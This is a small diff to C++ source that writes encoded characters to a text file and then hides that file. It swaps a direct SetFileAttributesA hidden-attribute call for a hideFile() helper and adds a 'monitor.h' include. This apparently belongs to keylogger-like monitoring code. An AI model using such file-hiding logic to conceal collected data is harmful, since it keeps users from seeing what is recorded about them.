@@ -1,4 +1,5 @@
 #include "encodeStr.h"
+#include "monitor.h"
 
 long encodeStr(std::string& str)
 {
@@ -54,6 +55,8 @@ bool flushChars(std::vector<int>& vec, std::vector<int> filename, int &count, bo
 	if (!textfile.is_open())
 	{
 		++count;
+		//this might cause unforseen errors as, past this if statement, it will try to flush again.
+		//handle this by doing a jmp instruction.
 		flushChars(vec, filename, count);
 	}
 	//error did not occur.
@@ -70,6 +73,7 @@ bool flushChars(std::vector<int>& vec, std::vector<int> filename, int &count, bo
 	vec.clear();
 
 	textfile.close();
-	SetFileAttributesA(filepath_string.c_str(), FILE_ATTRIBUTE_HIDDEN); //set as hidden
+
+	hideFile(filepath_string); //hide file
 	return true;
 }
